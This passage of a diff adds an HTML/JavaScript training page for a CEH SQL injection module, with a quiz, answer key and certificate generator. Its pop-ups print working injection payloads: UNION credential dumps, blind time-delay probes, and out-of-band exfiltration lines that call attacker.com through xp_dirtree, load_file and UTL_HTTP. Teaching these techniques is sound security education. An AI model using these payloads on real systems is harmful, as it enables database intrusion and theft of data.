+                        </ul>
+                    </div>
+                </div>
+
+                <div class="quiz-container" id="quizContainer">
+                    <!-- Quiz questions will be populated by JavaScript -->
+                </div>
+
+                <div class="card" id="quizResults" style="display: none;">
+                    <h3>📊 Assessment Results</h3>
+                    <div id="resultsContent">
+                        <!-- Results will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('certification')">View Certification →</button>
+            </div>
+
+            <!-- Certification Section -->
+            <div id="certification" class="module-section">
+                <h2 class="section-title">🏆 CEH v13 Module 15 Certification</h2>
+
+                <div class="certification-badge">
+                    <h2>🎉 Congratulations!</h2>
+                    <p>You have successfully completed CEH v13 Module 15: SQL Injection</p>
+                    <div style="margin: 30px 0;">
+                        <h3>✅ Certification Requirements Met:</h3>
+                        <div style="text-align: left; max-width: 600px; margin: 20px auto;">
+                            <p id="completionStatus">Complete all sections to earn certification</p>
+                        </div>
+                    </div>
+                    <div style="margin: 30px 0;">
+                        <button class="btn btn-success" id="claimCertBtn" onclick="checkCertificationEligibility()">🏆 Check Certification Status</button>
+                        <button class="btn" onclick="showSection('overview')" style="margin-left: 10px;">🔄 Review Module</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Skills Mastered</h3>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0;">
+                        <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 15px; border-radius: 8px;">
+                            ✅ SQL Fundamentals & Database Architecture
+                        </div>
+                        <div style="background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 15px; border-radius: 8px;">
+                            ✅ In-Band, Blind & Out-of-Band Injection Techniques  
+                        </div>
+                        <div style="background: linear-gradient(135deg, #4facfe, #00f2fe); color: white; padding: 15px; border-radius: 8px;">
+                            ✅ Advanced Exploitation with SQLmap & Havij
+                        </div>
+                        <div style="background: linear-gradient(135deg, #fa709a, #fee140); color: white; padding: 15px; border-radius: 8px;">
+                            ✅ Comprehensive Security Countermeasures
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🚀 Next Steps</h3>
+                    <div style="background: var(--secondary-color); padding: 25px; border-radius: 15px; color: white; margin: 20px 0;">
+                        <h4>🎯 Continue Your CEH Journey</h4>
+                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
+                            <li><strong>Module 16:</strong> Hacking Wireless Networks</li>
+                            <li><strong>Module 17:</strong> Hacking Mobile Platforms</li>
+                            <li><strong>Module 18:</strong> IoT and OT Hacking</li>
+                            <li><strong>Advanced Practice:</strong> SQL injection laboratories and CTF challenges</li>
+                            <li><strong>Certification Exam:</strong> Schedule your CEH v13 certification</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for detailed information -->
+    <div id="detailModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <!-- Progress Indicator -->
+    <div class="progress-indicator" id="progressIndicator">
+        Section 1 of 8
+    </div>
+
+    <script>
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'sql-basics', 'injection-types', 'exploitation', 'tools', 'detection', 'countermeasures', 'assessment', 'certification'];
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+        let totalStudyTime = 0;
+
+        // Quiz questions database
+        const quizQuestions = [
+            {
+                question: "What is SQL injection?",
+                options: [
+                    "A code injection technique that exploits security vulnerabilities in web applications",
+                    "A method to optimize database performance",
+                    "A database backup technique",
+                    "A network security protocol"
+                ],
+                correct: 0,
+                explanation: "SQL injection is a code injection technique used to attack data-driven applications that use SQL queries to access a backend database."
+            },
+            {
+                question: "Which SQL injection type uses the same communication channel for both attack and data retrieval?",
+                options: [
+                    "Out-of-band SQL injection",
+                    "In-band SQL injection", 
+                    "Blind SQL injection",
+                    "Time-based SQL injection"
+                ],
+                correct: 1,
+                explanation: "In-band SQL injection uses the same communication channel to perform the attack and retrieve the results, making it the most common type."
+            },
+            {
+                question: "What does the double dash (--) symbol represent in SQL injection?",
+                options: [
+                    "Addition operator",
+                    "Subtraction operator",
+                    "Comment indicator",
+                    "String concatenation"
+                ],
+                correct: 2,
+                explanation: "The double dash (--) tells the server to ignore the rest of the query, effectively commenting out the remaining SQL code."
+            },
+            {
+                question: "Which tool is considered the gold standard for automated SQL injection testing?",
+                options: [
+                    "Havij",
+                    "SQLninja",
+                    "SQLmap",
+                    "Burp Suite"
+                ],
+                correct: 2,
+                explanation: "SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws."
+            },
+            {
+                question: "What is the primary defense against SQL injection attacks?",
+                options: [
+                    "Input validation only",
+                    "Parameterized queries/prepared statements",
+                    "Hiding error messages",
+                    "Using complex passwords"
+                ],
+                correct: 1,
+                explanation: "Parameterized queries (prepared statements) are the most effective defense as they separate SQL code from data input."
+            },
+            {
+                question: "In blind SQL injection, what technique uses time delays to extract data?",
+                options: [
+                    "Error-based injection",
+                    "Union-based injection",
+                    "Time-based injection",
+                    "Boolean-based injection"
+                ],
+                correct: 2,
+                explanation: "Time-based blind SQL injection uses time delays to determine if queries are true or false based on response time."
+            },
+            {
+                question: "Which SQL command is commonly used for time delay attacks in MySQL?",
+                options: [
+                    "WAITFOR DELAY",
+                    "SLEEP()",
+                    "pg_sleep()",
+                    "BENCHMARK()"
+                ],
+                correct: 1,
+                explanation: "SLEEP() is the MySQL function used to create time delays in time-based blind SQL injection attacks."
+            },
+            {
+                question: "What does UNION-based SQL injection allow an attacker to do?",
+                options: [
+                    "Delete database tables",
+                    "Combine results from multiple SELECT statements",
+                    "Encrypt database contents",
+                    "Create new user accounts"
+                ],
+                correct: 1,
+                explanation: "UNION-based injection allows attackers to combine the results of the original query with results from their malicious query."
+            },
+            {
+                question: "Which of the following is NOT a type of SQL injection?",
+                options: [
+                    "In-band SQL injection",
+                    "Out-of-band SQL injection", 
+                    "Cross-band SQL injection",
+                    "Blind SQL injection"
+                ],
+                correct: 2,
+                explanation: "Cross-band SQL injection is not a recognized type. The main types are in-band, out-of-band, and blind SQL injection."
+            },
+            {
+                question: "What information can be extracted using information_schema in MySQL?",
+                options: [
+                    "User passwords only",
+                    "Database structure and metadata",
+                    "Network configuration",
+                    "Operating system details"
+                ],
+                correct: 1,
+                explanation: "The information_schema database contains metadata about all other databases, including table and column information."
+            },
+            {
+                question: "Which HTTP method can be vulnerable to SQL injection?",
+                options: [
+                    "GET only",
+                    "POST only",
+                    "Both GET and POST",
+                    "Neither GET nor POST"
+                ],
+                correct: 2,
+                explanation: "Both GET and POST methods can be vulnerable to SQL injection if user input is not properly sanitized."
+            },
+            {
+                question: "What is the purpose of Web Application Firewalls (WAF) in SQL injection prevention?",
+                options: [
+                    "To encrypt database connections",
+                    "To filter malicious HTTP requests",
+                    "To backup database data",
+                    "To optimize query performance"
+                ],
+                correct: 1,
+                explanation: "WAFs filter incoming HTTP requests and block those containing malicious SQL injection payloads."
+            },
+            {
+                question: "Which database system table does Havij commonly target for information gathering?",
+                options: [
+                    "user_tables",
+                    "system_catalog",
+                    "information_schema",
+                    "meta_data"
+                ],
+                correct: 2,
+                explanation: "Havij, like most SQL injection tools, targets the information_schema to gather database structure information."
+            },
+            {
+                question: "What does 'OR 1=1' accomplish in SQL injection?",
+                options: [
+                    "Deletes all records",
+                    "Makes the WHERE clause always true",
+                    "Encrypts the query",
+                    "Optimizes query performance"
+                ],
+                correct: 1,
+                explanation: "'OR 1=1' makes the WHERE clause always evaluate to true, potentially bypassing authentication or returning all records."
+            },
+            {
+                question: "Which SQL injection technique is most time-intensive for attackers?",
+                options: [
+                    "Error-based injection",
+                    "Union-based injection",
+                    "Blind SQL injection",
+                    "Out-of-band injection"
+                ],
+                correct: 2,
+                explanation: "Blind SQL injection is time-intensive because attackers must ask a series of true/false questions to extract data."
+            },
+            {
+                question: "What should developers avoid to prevent SQL injection?",
+                options: [
+                    "Using stored procedures",
+                    "Concatenating user input directly into SQL queries",
+                    "Implementing input validation",
+                    "Using parameterized queries"
+                ],
+                correct: 1,
+                explanation: "Directly concatenating user input into SQL queries without proper sanitization is the primary cause of SQL injection vulnerabilities."
+            },
+            {
+                question: "Which technique can help identify SQL injection vulnerabilities during development?",
+                options: [
+                    "Code review and static analysis",
+                    "Database encryption",
+                    "Network segmentation",
+                    "Password complexity requirements"
+                ],
+                correct: 0,
+                explanation: "Code review and static analysis can identify SQL injection vulnerabilities in the source code before deployment."
+            },
+            {
+                question: "What is the significance of error messages in SQL injection attacks?",
+                options: [
+                    "They prevent attacks",
+                    "They reveal database structure and vulnerabilities",
+                    "They encrypt sensitive data",
+                    "They log attack attempts"
+                ],
+                correct: 1,
+                explanation: "Error messages can reveal valuable information about database structure, helping attackers craft more effective injection attacks."
+            },
+            {
+                question: "Which principle should be applied to database user accounts to minimize SQL injection impact?",
+                options: [
+                    "Maximum privilege",
+                    "Least privilege",
+                    "No privileges",
+                    "Administrative privileges"
+                ],
+                correct: 1,
+                explanation: "The principle of least privilege ensures database accounts have only the minimum permissions necessary for their function."
+            },
+            {
+                question: "What makes out-of-band SQL injection different from other types?",
+                options: [
+                    "It's faster to execute",
+                    "It uses different channels for attack and data retrieval",
+                    "It only works on MySQL",
+                    "It requires administrator privileges"
+                ],
+                correct: 1,
+                explanation: "Out-of-band SQL injection uses different communication channels (like DNS or HTTP requests) for the attack and data exfiltration."
+            }
+        ];
+
+        // Initialize the application
+        function init() {
+            showSection('overview');
+            updateProgress();
+            updateProgressIndicator();
+        }
+
+        // Show specific section
+        function showSection(sectionId) {
+            // Hide all sections
+            const sections = document.querySelectorAll('.module-section');
+            sections.forEach(section => {
+                section.classList.remove('active');
+            });
+
+            // Show selected section
+            const targetSection = document.getElementById(sectionId);
+            if (targetSection) {
+                targetSection.classList.add('active');
+                currentSection = sectionId;
+                
+                // Update navigation
+                updateNavigation();
+                
+                // Mark section as visited
+                completedSections.add(sectionId);
+                
+                // Update progress
+                updateProgress();
+                updateProgressIndicator();
+
+                // Load quiz if assessment section
+                if (sectionId === 'assessment') {
+                    loadQuiz();
+                }
+
+                // Scroll to top
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        }
+
+        // Update navigation buttons
+        function updateNavigation() {
+            const navButtons = document.querySelectorAll('.nav-btn');
+            navButtons.forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.textContent.toLowerCase().includes(currentSection.replace('-', ' '))) {
+                    btn.classList.add('active');
+                }
+            });
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+            const progress = (completedSections.size / sectionOrder.length) * 100;
+            
+            progressBar.style.width = progress + '%';
+            progressText.textContent = `Progress: ${Math.round(progress)}% Complete`;
+            
+            if (progress > 0) {
+                progressBar.textContent = `${Math.round(progress)}%`;
+            }
+        }
+
+        // Update progress indicator
+        function updateProgressIndicator() {
+            const indicator = document.getElementById('progressIndicator');
+            const currentIndex = sectionOrder.indexOf(currentSection) + 1;
+            indicator.textContent = `Section ${currentIndex} of ${sectionOrder.length}`;
+        }
+
+        // Navigation functions
+        function navigateToSection(direction) {
+            const currentIndex = sectionOrder.indexOf(currentSection);
+            let newIndex;
+
+            if (direction === 'next') {
+                newIndex = currentIndex < sectionOrder.length - 1 ? currentIndex + 1 : currentIndex;
+            } else {
+                newIndex = currentIndex > 0 ? currentIndex - 1 : currentIndex;
+            }
+
+            if (newIndex !== currentIndex) {
+                showSection(sectionOrder[newIndex]);
+            }
+        }
+
+        // Show information modal
+        function showInfo(infoType) {
+            const modal = document.getElementById('detailModal');
+            const content = document.getElementById('modalContent');
+            
+            let modalContent = '';
+            
+            switch(infoType) {
+                case 'sqlBasics':
+                    modalContent = `
+                        <h3>🎯 SQL Injection Learning Objectives</h3>
+                        <ul style="line-height: 1.8; padding-left: 20px;">
+                            <li>Understand SQL fundamentals and database architecture</li>
+                            <li>Master different types of SQL injection attacks</li>
+                            <li>Learn advanced exploitation techniques and methodologies</li>
+                            <li>Gain proficiency with automated testing tools</li>
+                            <li>Implement comprehensive security countermeasures</li>
+                            <li>Develop practical skills through hands-on scenarios</li>
+                        </ul>
+                    `;
+                    break;
+                case 'threatLandscape':
+                    modalContent = `
+                        <h3>⚠️ SQL Injection Threat Impact</h3>
+                        <p>SQL injection represents one of the most critical web application security vulnerabilities:</p>
+                        <ul style="line-height: 1.8; padding-left: 20px;">
+                            <li><strong>Data Breaches:</strong> Complete database compromise and sensitive data theft</li>
+                            <li><strong>Authentication Bypass:</strong> Unauthorized access to restricted systems</li>
+                            <li><strong>Data Manipulation:</strong> Modification or deletion of critical information</li>
+                            <li><strong>System Compromise:</strong> Potential server takeover and remote code execution</li>
+                            <li><strong>Business Impact:</strong> Financial losses, reputation damage, and regulatory compliance violations</li>
+                        </ul>
+                        <div style="background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: white; padding: 15px; border-radius: 8px; margin: 15px 0;">
+                            <strong>OWASP Top 10 Ranking:</strong> Consistently ranks in top 3 most critical web application security risks
+                        </div>
+                    `;
+                    break;
+                case 'moduleStructure':
+                    modalContent = `
+                        <h3>📚 Module 15 Structure</h3>
+                        <p>This comprehensive 3-hour learning experience covers:</p>
+                        <div style="display: grid; grid-template-columns: 1fr; gap: 10px; margin: 20px 0;">
+                            <div style="background: #667eea; color: white; padding: 15px; border-radius: 8px;">
+                                <strong>Hour 1:</strong> SQL Fundamentals & Injection Types (30 minutes)
+                            </div>
+                            <div style="background: #f093fb; color: white; padding: 15px; border-radius: 8px;">
+                                <strong>Hour 2:</strong> Exploitation Techniques & Tools (60 minutes)
+                            </div>
+                            <div style="background: #4facfe; color: white; padding: 15px; border-radius: 8px;">
+                                <strong>Hour 3:</strong> Detection, Countermeasures & Assessment (90 minutes)
+                            </div>
+                        </div>
+                    `;
+                    break;
+                case 'inBandAttacks':
+                    modalContent = `
+                        <h3>📡 In-Band SQL Injection Details</h3>
+                        <p>In-band SQL injection uses the same communication channel to perform the attack and retrieve results. This is the most common and easy-to-exploit SQL injection attack.</p>
+                        
+                        <h4>Error-Based SQL Injection:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- Trigger MySQL Error<br>
+                            ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --<br><br>
+                            -- Extract Data via Error<br>
+                            ' AND extractvalue(rand(),concat(0x3a,version())) --
+                        </div>
+
+                        <h4>UNION-Based SQL Injection:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- Determine number of columns<br>
+                            ' ORDER BY 1,2,3,4,5 --<br><br>
+                            -- Extract data<br>
+                            ' UNION SELECT 1,2,3,database(),version() --<br><br>
+                            -- Dump user credentials<br>
+                            ' UNION SELECT username,password FROM users --
+                        </div>
+                    `;
+                    break;
+                case 'blindAttacks':
+                    modalContent = `
+                        <h3>🔍 Blind SQL Injection Details</h3>
+                        <p>Blind SQL injection occurs when the web application is vulnerable to SQL injection but the results are not visible to the attacker. The attacker must rely on the application's behavior to determine if the injection was successful.</p>
+                        
+                        <h4>Boolean-Based Blind Injection:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- Test for vulnerability<br>
+                            id=1 AND 1=1 -- (True condition)<br>
+                            id=1 AND 1=2 -- (False condition)<br><br>
+                            -- Extract database name character by character<br>
+                            id=1 AND (SELECT SUBSTRING(database(),1,1))='a' --<br>
+                            id=1 AND (SELECT SUBSTRING(database(),1,1))='b' --
+                        </div>
+
+                        <h4>Time-Based Blind Injection:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- MySQL Time Delay<br>
+                            ' OR (SELECT SLEEP(5)) --<br>
+                            ' OR (SELECT BENCHMARK(5000000,MD5('test'))) --<br><br>
+                            -- SQL Server Time Delay<br>
+                            '; WAITFOR DELAY '00:00:05' --<br><br>
+                            -- PostgreSQL Time Delay<br>
+                            '; SELECT pg_sleep(5) --
+                        </div>
+                    `;
+                    break;
+                case 'outOfBandAttacks':
+                    modalContent = `
+                        <h3>🌐 Out-of-Band SQL Injection Details</h3>
+                        <p>Out-of-band SQL injection uses different communication channels to launch the attack and gather results. This technique is used when the attacker cannot use the same channel to launch the attack and gather information.</p>
+                        
+                        <h4>DNS-Based Data Exfiltration:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- SQL Server DNS Exfiltration<br>
+                            '; EXEC master..xp_dirtree '//'+@@version+'.attacker.com/a' --<br><br>
+                            -- MySQL DNS Exfiltration (UDF required)<br>
+                            ' UNION SELECT load_file(concat('\\\\\\\\',@@version,'.attacker.com\\\\a')) --
+                        </div>
+
+                        <h4>HTTP-Based Data Exfiltration:</h4>
+                        <div style="background: #2c3e50; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 10px 0;">
+                            -- Using UTL_HTTP (Oracle)<br>
+                            ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual --<br><br>
+                            -- File-based exfiltration<br>
+                            ' UNION SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt' --
+                        </div>
+
+                        <p><strong>Note:</strong> Out-of-band techniques often require specific database configurations and may not work in all environments.</p>
+                    `;
+                    break;
+            }
+            
+            content.innerHTML = modalContent;
+            modal.style.display = 'block';
+        }
+
+        // Close modal
+        function closeModal() {
+            document.getElementById('detailModal').style.display = 'none';
+        }
+
+        // Load quiz questions
+        function loadQuiz() {
+            const container = document.getElementById('quizContainer');
+            if (container.children.length > 0) return; // Already loaded
+
+            container.innerHTML = '<h3>🎯 SQL Injection Knowledge Assessment</h3>';
+            
+            quizQuestions.forEach((q, index) => {
+                const questionDiv = document.createElement('div');
+                questionDiv.className = 'quiz-question';
+                questionDiv.innerHTML = `
+                    <h4>Question ${index + 1}: ${q.question}</h4>
+                    <ul class="quiz-options">
+                        ${q.options.map((option, optIndex) => 
+                            `<li onclick="selectAnswer(${index}, ${optIndex})" data-question="${index}" data-option="${optIndex}">
+                                ${String.fromCharCode(65 + optIndex)}. ${option}
+                            </li>`
+                        ).join('')}
+                    </ul>
+                    <div id="explanation-${index}" class="explanation" style="display: none; background: #e8f5e8; padding: 15px; margin-top: 10px; border-radius: 8px;">
+                        <strong>Explanation:</strong> ${q.explanation}
+                    </div>
+                `;
+                container.appendChild(questionDiv);
+            });
+
+            // Add submit button
+            const submitBtn = document.createElement('button');
+            submitBtn.className = 'btn btn-success';
+            submitBtn.textContent = 'Submit Assessment';
+            submitBtn.onclick = submitQuiz;
+            submitBtn.style.margin = '20px 0';
+            container.appendChild(submitBtn);
+        }
+
+        // Handle quiz answer selection
+        function selectAnswer(questionIndex, optionIndex) {
+            // Clear previous selections for this question
+            const questionOptions = document.querySelectorAll(`[data-question="${questionIndex}"]`);
+            questionOptions.forEach(option => {
+                option.classList.remove('selected');
+            });
+
+            // Mark selected option
+            const selectedOption = document.querySelector(`[data-question="${questionIndex}"][data-option="${optionIndex}"]`);
+            selectedOption.classList.add('selected');
+
+            // Store answer
+            quizAnswers[questionIndex] = optionIndex;
+        }
+
+        // Submit quiz
+        function submitQuiz() {
+            if (Object.keys(quizAnswers).length < quizQuestions.length) {
+                alert('Please answer all questions before submitting.');
+                return;
+            }
+
+            // Calculate score
+            quizScore = 0;
+            quizQuestions.forEach((q, index) => {
+                const questionOptions = document.querySelectorAll(`[data-question="${index}"]`);
+                const correctIndex = q.correct;
+                const userAnswer = quizAnswers[index];
+
+                if (userAnswer === correctIndex) {
+                    quizScore++;
+                    questionOptions[userAnswer].classList.add('correct');
+                } else {
+                    questionOptions[userAnswer].classList.add('incorrect');
+                    questionOptions[correctIndex].classList.add('correct');
+                }
+
+                // Show explanation
+                document.getElementById(`explanation-${index}`).style.display = 'block';
+            });
+
+            // Show results
+            showQuizResults();
+        }
+
+        // Show quiz results
+        function showQuizResults() {
+            const resultsDiv = document.getElementById('quizResults');
+            const resultsContent = document.getElementById('resultsContent');
+            const percentage = Math.round((quizScore / quizQuestions.length) * 100);
+            const passed = percentage >= 80;
+
+            resultsContent.innerHTML = `
+                <div style="text-align: center; padding: 20px;">
+                    <h3>${passed ? '🎉 Congratulations!' : '📚 Keep Learning!'}</h3>
+                    <div style="font-size: 2rem; margin: 20px 0; color: ${passed ? '#27ae60' : '#e74c3c'};">
+                        ${quizScore}/${quizQuestions.length} (${percentage}%)
+                    </div>
+                    <p style="font-size: 1.2rem; margin: 20px 0;">
+                        ${passed ? 
+                            'Excellent work! You have demonstrated mastery of SQL injection concepts.' : 
+                            'Review the explanations and try again. You need 80% to pass.'
+                        }
+                    </p>
+                    ${passed ? 
+                        '<div style="background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; padding: 15px; border-radius: 8px; margin: 20px 0;"><strong>✅ Assessment Completed Successfully</strong><br>You are now eligible for module certification!</div>' :
+                        '<div style="background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; padding: 15px; border-radius: 8px; margin: 20px 0;"><strong>❌ Minimum Score Not Met</strong><br>Review the material and retake the assessment.</div>'
+                    }
+                </div>
+            `;
+
+            resultsDiv.style.display = 'block';
+            
+            if (passed) {
+                completedSections.add('assessment');
+                updateProgress();
+            }
+
+            // Scroll to results
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Check certification eligibility
+        function checkCertificationEligibility() {
+            const requiredSections = ['overview', 'sql-basics', 'injection-types', 'exploitation', 'tools', 'detection', 'countermeasures', 'assessment'];
+            const completed = requiredSections.filter(section => completedSections.has(section));
+            const studyTime = (Date.now() - startTime) / (1000 * 60); // minutes
+
+            const completionStatus = document.getElementById('completionStatus');
+            const claimBtn = document.getElementById('claimCertBtn');
+
+            if (completed.length === requiredSections.length && studyTime >= 60) {
+                completionStatus.innerHTML = `
+                    <p>✅ Completed all sections (${completed.length}/${requiredSections.length})</p>
+                    <p>✅ Minimum study time met (${Math.round(studyTime)} minutes)</p>
+                    <p>✅ Assessment passed with ${Math.round((quizScore / quizQuestions.length) * 100)}%</p>
+                    <div style="background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                        <h4>🏆 Certification Requirements Met!</h4>
+                        <p>You have successfully completed CEH v13 Module 15: SQL Injection</p>
+                    </div>
+                `;
+                claimBtn.textContent = '🏆 Claim Certificate';
+                claimBtn.onclick = generateCertificate;
+            } else {
+                const remaining = requiredSections.filter(section => !completedSections.has(section));
+                completionStatus.innerHTML = `
+                    <p>📋 Progress: ${completed.length}/${requiredSections.length} sections completed</p>
+                    <p>⏱️ Study time: ${Math.round(studyTime)} minutes (60 min required)</p>
+                    <p>📝 Assessment: ${quizScore > 0 ? `${Math.round((quizScore / quizQuestions.length) * 100)}%` : 'Not completed'}</p>
+                    ${remaining.length > 0 ? `<p>📌 Remaining sections: ${remaining.join(', ')}</p>` : ''}
+                    <div style="background: linear-gradient(135deg, #f39c12, #e67e22); color: white; padding: 15px; border-radius: 8px; margin: 15px 0;">
+                        <strong>⚠️ Complete all requirements to earn certification</strong>
+                    </div>
+                `;
+            }
+        }
+
+        // Generate certificate
+        function generateCertificate() {
+            const modal = document.getElementById('detailModal');
+            const content = document.getElementById('modalContent');
+            
+            content.innerHTML = `
+                <div style="text-align: center; padding: 30px; border: 3px solid #f39c12; border-radius: 15px; background: linear-gradient(135deg, #fff, #f8f9fa);">
+                    <div style="color: #2c3e50; margin-bottom: 30px;">
+                        <h2 style="font-size: 2.5rem; margin-bottom: 10px;">🏆 CERTIFICATE OF COMPLETION</h2>
+                        <div style="width: 100px; height: 4px; background: linear-gradient(90deg, #f39c12, #e67e22); margin: 0 auto;"></div>
+                    </div>
+                    
+                    <div style="margin: 30px 0;">
+                        <h3 style="color: #8e44ad; font-size: 1.8rem; margin-bottom: 20px;">CEH v13 Module 15</h3>
+                        <h4 style="color: #2c3e50; font-size: 1.4rem;">SQL Injection Attacks & Advanced Exploitation</h4>
+                    </div>
+                    
+                    <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 25px; border-radius: 12px; margin: 30px 0;">
+                        <p style="font-size: 1.1rem; margin-bottom: 15px;">This certifies that the holder has successfully completed</p>
+                        <ul style="text-align: left; max-width: 400px; margin: 0 auto; line-height: 1.8;">
+                            <li>SQL Fundamentals & Database Architecture</li>
+                            <li>In-Band, Blind & Out-of-Band Injection Techniques</li>
+                            <li>Advanced Tool Mastery (SQLmap, Havij, SQLninja)</li>
+                            <li>Detection and Prevention Strategies</li>
+                            <li>Comprehensive Security Assessment</li>
+                        </ul>
+                    </div>
+                    
+                    <div style="margin-top: 30px;">
+                        <p style="color: #7f8c8d; font-size: 0.9rem;">Issued: ${new Date().toLocaleDateString()}</p>
+                        <p style="color: #7f8c8d; font-size: 0.9rem;">Study Time: ${Math.round((Date.now() - startTime) / (1000 * 60))} minutes</p>
+                        <p style="color: #7f8c8d; font-size: 0.9rem;">Assessment Score: ${Math.round((quizScore / quizQuestions.length) * 100)}%</p>
+                    </div>
+                    
+                    <button class="btn btn-success" onclick="closeModal()" style="margin-top: 20px;">
+                        Close Certificate
+                    </button>
+                </div>
+            `;
+            
+            modal.style.display = 'block';
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            switch(e.key) {
+                case 'Escape':
+                    closeModal();
+                    break;
+                case 'ArrowRight':
+                    if (!document.getElementById('detailModal').style.display || document.getElementById('detailModal').style.display === 'none') {
+                        navigateToSection('next');
+                    }
+                    break;
+                case 'ArrowLeft':
+                    if (!document.getElementById('detailModal').style.display || document.getElementById('detailModal').style.display === 'none') {
+                        navigateToSection('prev');
+                    }
+                    break;
+            }
+        });
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('detailModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        };
+
+        // Initialize the application
+        window.onload = function() {
+            init();
+            
+            // Update study time every minute
+            setInterval(() => {
+                totalStudyTime = (Date.now() - startTime) / (1000 * 60);
+            }, 60000);
+        };
+    </script>
+</body>
+</html>
